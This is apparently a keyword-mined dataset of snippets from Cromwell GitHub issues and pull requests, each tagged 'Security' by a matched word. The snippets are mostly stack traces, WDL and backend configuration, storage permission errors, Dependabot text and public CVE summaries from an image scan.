akka.actor.Timers.aroundReceiv",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:4879,hash,hash,4879,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['hash'],['hash']
Security,nstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); 	at cats.Traverse$Ops.traverse(Traverse.scala:19); 	at cats.Traverse$Ops.traverse$(Traverse.scala:19); 	at cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); 	at cromwell.core.path.PathBuilderFactory$.instantiatePathBuilders(PathBuilderFactory.scala:23); 	at cromwell.engine.EngineFilesystems$.pathBuildersForWorkflow(EngineFilesystems.scala:29); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$workflowOptionsAndPathBuilders$1(MaterializeWorkflowDescriptorActor.scala:226); 	at cats.data.Validated.map(Validated.scala:204); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowOptionsAndPathBuilders(MaterializeWorkflowDescriptorActor.scala:225); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:159); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:155); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at akka.actor.FSM.processEvent(FSM.scala:684); 	at akka.actor.FSM.processEvent$(FSM.scala:681); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:136); 	at akka.actor.LoggingFSM.processEv,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:3490,Validat,Validated,3490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['Validat'],['Validated']
Security,"nt cpu = 1; Float? memory_gb; String? sge_queue; String? sge_project; """"""; }; ```. My intent is for the user to only provide arguments for `cpu`, `memory`, `runtime_minutes`, and `partition` if they intend to override the SLURM cluster's defaults. I do not want to have cromwell supply defaults, because if these arguments are omitted from the call to `sbatch` then the cluster's defaults will be used. My understanding is that making them optional like `String? memory_mb` and then using syntax like `${""--mem "" + round(memory_mb) + ""m""} \` in the submit script means that argument will only be added if `memory` is defined, and will be omitted if `memory` is not defined. I've followed the documentation as closely as I can. However, when I try to submit a test job without `cpu` and `memory` set as a runtime attribute, I get a failure with these exceptions:; ```; cromwell.core.CromwellAggregatedException: Initialization Failure:; Runtime validation failed:; 	Task myTask has an invalid runtime attribute cpu = !! NOT FOUND !!; 	Task myTask has an invalid runtime attribute memory = !! NOT FOUND !!; 	at cromwell.engine.workflow.WorkflowActor$$anonfun$3.applyOrElse(WorkflowActor.scala:356); 	at cromwell.engine.workflow.WorkflowActor$$anonfun$3.applyOrElse(WorkflowActor.scala:339); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:35); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); ```. Here is the test WDL I'm using:. ```; # Example workflow; # Declare WDL version 1.0 if working in Terra; version 1.0; workflow myWorkflow {; call myTask. }. task myTask {; command <<<; echo ""hello world""; >>>; output {; String out = read_string(stdout()); }; }; ```. And my complete configuration for this backend:; ```; backend {; default = slurm. providers {; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"" ; config {; runtime-attributes = """"""; Int? runtime_minutes; Int? cpu;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7455:1448,validat,validation,1448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7455,1,['validat'],['validation']
Security,"nt_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list -> /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list (cp failed: gsutil -q -m cp gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list, command failed: AccessDeniedException: 403 Caller does not have storage.objects.list access to bucket firecloud-tcga-open-access.\nCommandException: 1 file/object could not be transferred.\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:489); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:61); ....snip....; ```; ; BUT I would think this next operation would fail and it does not:; ```; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ gsutil ls gs://firecloud-tcga-open-access/tutorial/reference/; gs://firecloud-tcga-open-access/tutorial/reference/CNV.hg19.bypos.111213.txt; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.dict; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.fasta; gs://firecloud-tcga-open-access/tutorial/reference/Homo_sapiens_assembly19.fasta.fai; ```. and: ; ```; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ gsutil ls gs://firecloud-tcga-open-access/; gs://firecloud-tcga-open-access/merged/; gs://firecloud-tcga-open-access/tcga/; gs://firecloud-tcga-open-access/tutorial/; gs://firecloud-tcga-open-access/workshop/; lichtens@lichtens-big:~/test_dl_oxoq/create_bs$ ; ```. @kshakir",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1960:1776,access,access,1776,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1960,10,['access'],['access']
Security,"nting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language; - `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language; - `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language. You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/broadinstitute/cromwell/network/alerts). </details>",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5941:6156,secur,security,6156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5941,22,"['Secur', 'secur']","['Security', 'security']"
Security,"ntrifugeList){; call centrifugeDownload {; input:; centrifugeOutput= centrifuge.outputDir,; domain=centrifuge.domain,; database=if defined(centrifuge.database) then centrifuge.database else ""refseq""; }; }; }; ```; The `centrifugeList` is a list of dictionaries. The resulting `centrifuge` `object` may or may not have a key database. . ## Expected behaviour:; `database` defaults to `""refseq""` if no `database` key is present in the dictionary. It will use the database key if it exists. ## Observed behaviour:; ```; java.lang.RuntimeException: Evaluating if defined(centrifuge.database) then centrifuge.database else ""refseq"" failed: Could not find key database in WdlObject; at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2(ExpressionKey.scala:36); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.$anonfun$processRunnable$2$adapted(ExpressionKey.scala:31); at scala.Function1.$anonfun$andThen$1(Function1.scala:52); at cats.data.Validated.fold(Validated.scala:14); at cats.data.Validated.bimap(Validated.scala:109); at cats.data.Validated.map(Validated.scala:152); at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:31); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$4(WorkflowExecutionActor.scala:452); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$2(WorkflowExecutionActor.scala:449); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$processRunnableTaskCallInputExpression$1(WorkflowExecutionActor.scala:448); at scala.util.Either.flatMap(Either.scala:338); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processRunnableTaskCallInputExpression(WorkflowExecutionActor.scala:447); at c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093:1059,Validat,Validated,1059,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093,1,['Validat'],['Validated']
Security,"o docker runtime attributes with a ""floating"" tag, which will be referred as ""tag"" in this issue. In all cases, if Cromwell fails to retrieve the docker hash for a task, for any reason, the corresponding call(s) will NOT be eligible for call caching, neither read nor write, regardless of the call caching configuration in effect. **When to get the hashes and what to do with them:**. 1. Cromwell will lookup the hashes corresponding to docker tags, for all docker attributes in all tasks in a workflow and its subworkflows, at Materialization time.; If the runtime attribute value can't be determined, the task in question will be ineligible for call caching. The only case when that should be true is if the attribute is an expression with variables depending on previous tasks being run. 2. If the hash lookup succeed, Cromwell will use that hash to perform any call cache read / write according to the call caching configuration in effect. It will also provide that hash, along with the original floating tag, to the backend when the job gets dispatched. 3. Backends will choose wether to use the hash or the floating tag. They will report to the engine which one they used, so that the engine can send this information to the metadata. **How to get the hash:**. 1. How to get the hash depends on the backend. Which means, at this time, that only workflows for which the backend is known statically at workflow submission time will be supported. 2. If the task is expected to run on the **Local Backend**, Cromwell will attempt to find the hash corresponding to the tag on the machine where it's being run. This first attempt must be done without executing a `pull` to avoid overriding the current local image, if it exits, with the remote repository version.; If the image is not present locally, cromwell will attempt to `pull` the image locally, and use the hash from the newly retrieved image. 3. If the task is expected to run on a **Non Local Backend**, cromwell will attempt to retrieve the",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:1224,hash,hash,1224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,1,['hash'],['hash']
Security,"o review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/goog",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1132,audit,audit,1132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452,1,['audit'],['audit']
Security,"o use your Jira tracker, it let me log in but told me I don't have permission to see anything or do anything; 2: https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team no longer exists, and the support staff respond to questions with ""we only answer GATK isues""; 3: I am using womtool 65 and Cromwell 62. I get the same failure in both, which is that if the first line of my file is:. `version development`. As per the [WDL specifications](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#versioning) I get the error:. `ERROR: Finished parsing without consuming all tokens.`. If I do not include that line, then I get this error:. ```; Expected rbrace, got Directory.; Directory	OutputDir; ```. Does Cromwell support WDL versions pther than the default? if so, how do I specify which version to use?. Thank you,; ###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438:1965,PASSWORD,PASSWORDS,1965,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438,1,['PASSWORD'],['PASSWORDS']
Security,"oadinstitute/cromwell:dev; clair timeout 1m0s; docker timeout: 1m0s; no whitelist file; Analysing 10 layers; Got results from Clair API v1; Found 139 vulnerabilities; Unknown: 3; Negligible: 47; Low: 38; Medium: 44; High: 7. CVE-2017-12424: [High] ; Found in: shadow [1:4.4-4.1]; Fixed By: ; In shadow before 4.5, the newusers tool could be made to manipulate internal data structures in ways unintended by the authors. Malformed input may lead to crashes (with a buffer overflow or other memory corruption) or other unspecified behaviors. This crosses a privilege boundary in, for example, certain web-hosting environments in which a Control Panel allows an unprivileged user account to create subaccounts.; https://security-tracker.debian.org/tracker/CVE-2017-12424; -----------------------------------------; CVE-2018-13347: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; mpatch.c in Mercurial before 4.6.1 mishandles integer addition and subtraction, aka OVE-20180430-0002.; https://security-tracker.debian.org/tracker/CVE-2018-13347; -----------------------------------------; CVE-2017-17458: [High] ; Found in: mercurial [4.0-1+deb9u1]; Fixed By: ; In Mercurial before 4.4.1, it is possible that a specially malformed repository can cause Git subrepositories to run arbitrary code in the form of a .git/hooks/post-update script checked into the repository. Typical use of Mercurial prevents construction of such repositories, but they can be created programmatically.; https://security-tracker.debian.org/tracker/CVE-2017-17458; -----------------------------------------; CVE-2017-12562: [High] ; Found in: libsndfile [1.0.27-3]; Fixed By: ; Heap-based Buffer Overflow in the psf_binheader_writef function in common.c in libsndfile through 1.0.28 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact.; https://security-tracker.debian.org/tracker/CVE-2017-12562; -----------------------------------------; CVE-2018-1000001: ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979:1510,secur,security-tracker,1510,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979,1,['secur'],['security-tracker']
Security,obscure validation error: Expected rbrace after `input:` in call,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5256:8,validat,validation,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5256,1,['validat'],['validation']
Security,"of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 25000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. #docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json"". # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:2295,secur,security,2295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['secur'],['security']
Security,"oint so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expres",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:1223,Validat,Validated,1223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,1,['Validat'],['Validated']
Security,"okay, that works for me! To answer your questions about CircleCI:. - environment variables used in the project are [encrypted](https://circleci.com/docs/2.0/security/#encryption) also using hashicorp vault! So, same thing or if not very similar deal as what you have.; - once you set them in the interface, you can't change or see them; - if the environment variables aren't set in the container with ENV or as flags with --env then they won't be saved. You would likely want to have them be [ARGS](https://vsupalov.com/docker-arg-env-variable-guide/) instead to be used and available in the container during build, but then not persisted in the container. So, as long as:; - you set secrets in the project and not the circle.yml; - you don't allow the CI to pass on secrets to other forked build requests (you would have to turn it on in settings are there are a lot of **warning don't do this!** prompts before you get there and; - you use ARGS to expose needed variables from the environment to the container for building (that don't get saved). . I think you'd be ok :) But sure, I'm definitely not a security expert. Anyway, since it's a single file, please feel free to grab the commit from here if/when you are ready.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110:116,encrypt,encrypted,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416275110,12,"['encrypt', 'expose', 'hash', 'secur']","['encrypted', 'encryption', 'expose', 'hashicorp', 'security']"
Security,"om `wdl.transforms.base.linking.expression.values.EngineFunctionEvaluators`, but I'm getting errors on the evaluateValue:. ```scala; val value1 = expressionValueEvaluator.evaluateValue(a.arg1, inputs, ioFunctionSet, forCommandInstantiationOptions)(expressionValueEvaluator); val value2 = expressionValueEvaluator.evaluateValue(a.arg2, inputs, ioFunctionSet, forCommandInstantiationOptions)(expressionValueEvaluator); processTwoValidatedValues[WomArray, WomString, WomString](value1, value2) { (arr1, sepvalue) =>; EvaluatedValue(WomString(arr1.value.mkString(sepvalue.value)), Seq.empty).validNel; }; ```. But I get the following error:. ```; [error] /Users/franklinmichael/source/cromwell/wdl/transforms/biscayne/src/main/scala/wdl/transforms/biscayne/linking/expression/values/BiscayneValueEvaluators.scala:164:64: type mismatch;; [error] found : common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]]; [error] (which expands to) cats.data.Validated[cats.data.NonEmptyList[String],wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]]; [error] required: common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]; [error] (which expands to) cats.data.Validated[cats.data.NonEmptyList[String],wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]; [error] processTwoValidatedValues[WomArray, WomString, WomString](value1, value2) { (arr1, sepvalue) =>; [error] ^; [info] common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]] <: common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]?; ```. I also tried switching this to use:. ```scala; processTwoValidatedValues[WomArray, WomString, WomString](a.arg1.evaluateValue(inputs, ioFunctionSet, forCommandInstantiationOptions), a.arg2.evaluateValue(inputs, ioFunctionSet, forCommandInstantiationOptions)) { (arr1, sepvalue",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494:1507,Validat,Validated,1507,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494,1,['Validat'],['Validated']
Security,om.WdlDraft2WomGraphMaker$.foldFunction$1(WdlDraft2WomGraphMaker.scala:37); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfun$toWomGraph$14(WdlDraft2WomGraphMaker.scala:98); 	at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); 	at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); 	at scala.collection.immutable.List.foldLeft(List.scala:86); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:98); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$9(WdlDraft2WomScatterNodeMaker.scala:55); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.$anonfun$toWomScatterNode$7(WdlDraft2WomScatterNodeMaker.scala:52); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:51); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomScatterNodeMaker$.toWomScatterNode(WdlDraft2WomScatterNodeMaker.scala:15); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$Ops.toWomScatterNode$(WomScatterNodeMaker.scala:10); 	at wom.transforms.WomScatterNodeMaker$ops$$anon$1.toWomScatterNode(WomScatterNodeMaker.scala:10); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.buildNode$1(WdlDraft2WomGraphMaker.scala:90); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.$anonfu,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:4316,validat,validation,4316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,1,['validat'],['validation']
Security,"ome detailed information:**. I have tried Cromwell 31.1 and 31. I start Cromwell using this command; `java -Dconfig.file=google.conf -jar cromwell-31.jar server`. **google.conf**; (I have changed the actual project name to generic ""project""); ```; include required(classpath(""application"")). google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""project-test1""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""project-test1"". // Base bucket for workflow executions; root = ""gs://project-test1/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // This allows you to use an alternative service account to launch jobs, by default uses default service account; compute-service-account = ""default""; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""project-test1""; }; }; }; }; }; }; ```. I created the service account from https://cloud.google.com/docs/authentication/getting-started and give the role: Project -> Owner. I've downloaded Google Cloud SDK and run these; ```; gcloud auth login juha.wilppu@gmail.com; gcloud auth application-default login; gcloud",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690:4745,access,access,4745,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690,1,['access'],['access']
